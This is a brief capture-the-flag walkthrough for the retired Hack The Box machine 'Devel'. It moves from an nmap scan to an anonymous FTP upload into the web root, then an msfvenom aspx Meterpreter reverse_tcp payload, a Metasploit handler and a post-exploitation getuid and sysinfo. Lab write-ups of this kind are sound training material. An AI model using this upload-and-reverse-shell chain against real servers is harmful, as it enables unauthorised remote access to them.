https://app.hackthebox.com/machines/3

**Devel** *(EASY - RETIRED)*

```
sudo nmap -A -T4 -p- 10.129.234.141
```

![[Pasted image 20230530170427.png]]

```
echo "this is a test" > test.txt
```

![[Pasted image 20230530164800.png]]

```
ftp 10.129.234.141
```

*anonymous : anonymous*

```
put test.txt
```

![[Pasted image 20230530170808.png]]

```
http://10.129.234.141/test.txt
```

![[Pasted image 20230530170845.png]]

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > exploit.aspx
```

![[Pasted image 20230530171010.png]]

```
msfconsole -q
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```

![[Pasted image 20230530171632.png]]

![[Pasted image 20230530171753.png]]

![[Pasted image 20230530171849.png]]
![[Pasted image 20230530171931.png]]

```
getuid

sysinfo

```

![[Pasted image 20230530172139.png]]

